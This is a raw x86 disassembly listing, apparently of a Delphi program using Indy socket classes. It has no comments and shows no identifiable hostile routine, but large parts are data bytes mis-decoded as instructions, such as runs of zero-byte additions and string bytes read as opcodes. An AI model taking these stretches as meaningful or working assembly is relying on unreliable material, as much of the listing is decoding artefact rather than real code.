call sub_45f8ec
mov eax sub_45fb6c
call sub_418248
mov eax [ rw-data ]
push eax
call CloseHandle
sub_469f68
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x9f
inc esi
add [ eax + eax ] cl
add [ eax ] al
int3
sub_46a1a9
mov eax [ 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_46a210
add [ eax ] al
mov eax eax
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
mov [ 0xc0046 ] eax
add [ eax ] al
xor al 0xa3
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ 0x53644945 ] dl
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
outsd
outsb
and [ ebx + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0046a3 ] al
add [ eax ] al
and [ ebx + 0x46 ] ah
arpl [ edi + 0x6c ] bp
push edx
jo r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0046a4 ] ch
add [ eax ] al
add [ ebx ] dh
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
movsb [ edi ] [ esi ]
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
inc esi
jae r-xdata
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xa4
inc esi
add [ eax + eax ] cl
add [ eax ] al
xor al 0xa3
inc esi
add [ eax + eax ] cl
add [ eax ] al
xor al 0xa3
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ebx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0xa440c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5c ] al
nop
jae r-xdata
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ebx ] dl
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : ebp + eax * 2 + 0x78 ] si
arpl [ ebp + 0x70 ] sp
je r-xdata
rcr ah 0xa3
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ecx ] dl
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x69 ] si
insd
outsd
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
movsd [ edi ] [ esi ]
inc esi
add [ eax + eax ] cl
outsd
jb r-xdata
adc [ ebp + 0x46 ] ah
push ebx
jb r-xdata
add [ edi + ebx * 4 + 0x46 ] ah
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ 0x53644945 ] cl
outsd
arpl [ ebx + 0x73 ] bp
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebx + 0xc0046 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebx + 0xc0046 ] ah
add [ eax ] al
lahf
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
outsd
jb r-xdata
add [ eax ] al
push 0x6f727245
jb r-xdata
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edi ] dl
inc ebp
jae r-xdata
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
add [ eax + eax ] cl
add [ eax ] al
xor al 0xa3
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
inc esi
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax * 2 + 0x6f536449 ] dl
arpl [ ebx + 0x73 ] bp
push ebp
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
add [ ebx ] dh
inc eax
add [ ebx + esi ] bl
add [ eax ] al
xor al 0xa3
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x46a51090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
movsd [ edi ] [ esi ]
inc esi
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x6874654d
outsd
inc ebp
jb r-xdata
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x46 ] dh
inc eax
add [ ebp + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ebp + 0xc0046 ] ah
jb r-xdata
push ebx
jb r-xdata
rol al 0xa2
inc esi
add [ eax ] al
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
jb r-xdata
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
shl [ eax + 0x46a6 ] 0x0
add [ eax ] al
outsd
outsb
inc ebp
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xc0046a6 ]
add [ eax ] al
add [ ebx ] dh
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsd
jb r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
popad
imul ebp [ ebp + 0x64 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
mov [ 0xc0046 ] al
add [ eax ] al
lahf
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
mov [ 0x100046 ] al
add [ eax ] al
lahf
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax - 0x56 ] bh
inc esi
add [ 0x50644945 ] dl
jb r-xdata
imul esp [ ebx + 0x65 ] 0x656d614e
mov eax eax
pop eax
mov [ 0x46 ] al
jb r-xdata
outsd
jb r-xdata
add [ ebx ] dh
inc eax
add [ ebx + esi ] bl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5a ] al
inc esi
add [ eax + eax ] cl
add [ eax ] al
xor al 0xa3
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
outsd
jb r-xdata
jb r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ 0x53644945 ] bl
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax + 0x4035 ] ah
outsb
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ecx ] dl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
cmpsb [ esi ] [ edi ]
inc esi
in al 0xa7
push esp
test al 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 4 + 0x46 ] dl
add [ eax + eax ] cl
add [ eax ] al
xor al 0xa3
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
jb r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
cmpsd [ esi ] [ edi ]
inc esi
add [ eax + eax ] cl
add [ eax ] al
xor al 0xa3
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
shl ah 0xa7
push ebp
outsb
jb r-xdata
jb r-xdata
jb r-xdata
imul esi [ ebx + 0x73 ] 0x456e6f69
inc ebp
jb r-xdata
add [ eax ] al
xor al 0xa3
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
fsub [ ebp + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsub [ ebp + 0xc0046 ]
jb r-xdata
shl [ edi + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
jb r-xdata
insb
inc ebp
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jb r-xdata
push esp
jb r-xdata
mov eax eax
outsd
jbe r-xdata
popad
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
xor eax [ eax ]
inc eax
add [ eax + 0x4035 ] ah
je r-xdata
jb r-xdata
popad
xor eax 0x35ac0040
inc eax
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ecx ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
inc esi
add [ eax + eax ] cl
add [ eax ] al
xor al 0xa3
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x46 ] dh
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax * 2 + 0x6f536449 ] ah
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
test al 0x35
outsd
jae r-xdata
outsd
jb r-xdata
imul esi [ edx + 0x65 ] 0x72724564
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
outsd
outsb
outsb
add [ 0x53644945 ] bl
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
jb r-xdata
outsd
jb r-xdata
outsd
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0xc0046 ] ah
add [ eax ] al
xor al 0xa3
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
or [ edi + 0x46 ] ah
shl [ ecx + ebp * 4 ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 4 ] dh
inc esi
add [ eax + eax ] cl
add [ eax ] al
xor al 0xa3
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
test eax 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xa9
outsb
push edx
jne r-xdata
outsd
inc ebp
jb r-xdata
pushfd
test eax 0x46
jb r-xdata
jb r-xdata
nop
inc eax
add al cl
test al 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
test al 0x46
add [ eax + eax ] cl
add [ eax ] al
xor al 0xa3
inc esi
nop
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
test eax 0xc0046
add [ eax ] al
xor al 0xa3
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 4 ] al
inc esi
add [ eax + eax ] cl
add [ eax ] al
lahf
inc esi
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
push esp
dec esp
inc ebp
js r-xdata
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
insb
imul esp [ ebx + edx * 2 + 0x6f ] 0x74656b63
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsd
insd
insd
popad
pop ebx
pop ebp
retn 0x4
jb r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax ] dl
inc ebp
dec ecx
dec ecx
xor eax 0x35ac0040
inc eax
add [ eax + 0x4035 ] ah
jb r-xdata
mov eax edi
test bl bl
je r-xdata
outsd
jb r-xdata
lea eax [ eax ]
stosb [ edi ]
inc esi
add [ eax ] al
add [ eax ] al
jae r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
outsb
jbe r-xdata
dec ecx
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x56 ] ch
inc esi
add [ eax ] dl
add [ eax ] al
add [ edi + ebx * 4 + 0x46 ] ah
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add al al
stosb [ edi ]
inc esi
add [ esi ] cl
inc ebp
dec ecx
push ebx
outsd
jb r-xdata
outsb
inc ebp
add al 0xaa
inc esi
add [ eax ] al
add [ eax ] al
sub_46aa78
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40bb3c
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_46aac0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40bb3c
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_46ab08
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46ab2d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ab34
retn
sub_46ab40
inc esi
dec eax
add bh dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ eax + 0x640000fe ] dh
inc esi
dec eax
add [ ecx + 0x640000fe ] dh
inc esi
dec eax
add [ edx + 0x640000fe ] dh
inc esi
dec eax
add [ ebx + 0x640000fe ] dh
inc esi
dec eax
add [ esi + edi * 8 + 0x46640000 ] dh
dec eax
add [ ebp + 0x640000fe ] dh
inc esi
dec eax
add [ esi + 0x640000fe ] dh
inc esi
dec eax
add [ edi + 0x640000fe ] dh
inc esi
dec eax
add [ eax + 0x640000fe ] bh
inc esi
dec eax
add [ ecx + 0x640000fe ] bh
inc esi
dec eax
add [ edx + 0x640000fe ] bh
inc esi
dec eax
add [ ebx + 0x640000fe ] bh
inc esi
dec eax
add [ esi + edi * 8 + 0x46640000 ] bh
dec eax
add [ ebp + 0x640000fe ] bh
inc esi
dec eax
add [ esi + 0x640000fe ] bh
inc esi
dec eax
add [ edi + 0x640000fe ] bh
inc esi
dec eax
add [ eax + 0x640000fe ] ah
inc esi
dec eax
add [ ecx + 0x640000fe ] ah
inc esi
dec eax
add [ edx + 0x640000fe ] ah
inc esi
dec eax
add [ ebx + 0x640000fe ] ah
inc esi
dec eax
add [ esi + edi * 8 + 0x46640000 ] ah
dec eax
add [ ebp + 0x640000fe ] ah
inc esi
dec eax
add [ esi + 0x640000fe ] ah
inc esi
dec eax
add [ edi + 0x640000fe ] ah
inc esi
dec eax
add [ eax + 0x640000fe ] ch
inc esi
dec eax
add [ ecx + 0x640000fe ] ch
inc esi
dec eax
add [ edx + 0x640000fe ] ch
inc esi
dec eax
add [ ebx + 0x640000fe ] ch
inc esi
dec eax
add [ esi + edi * 8 + 0x46640000 ] ch
dec eax
add [ ebp + 0x640000fe ] ch
inc esi
dec eax
add [ esi + 0x550000fe ] ch
mov ebp esp
xor eax eax
push ebp
push sub_46ae25
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ae2c
retn
sub_46aeb0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46af50
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx edi
call sub_4041b8
mov [ ebx + 0xc ] esi
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_4036b4
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40b334
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_4041b8
push edi
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4044e4
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
call sub_40bb3c
mov ecx edi
xor edx edx
mov eax ebx
call sub_40bb3c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46af57
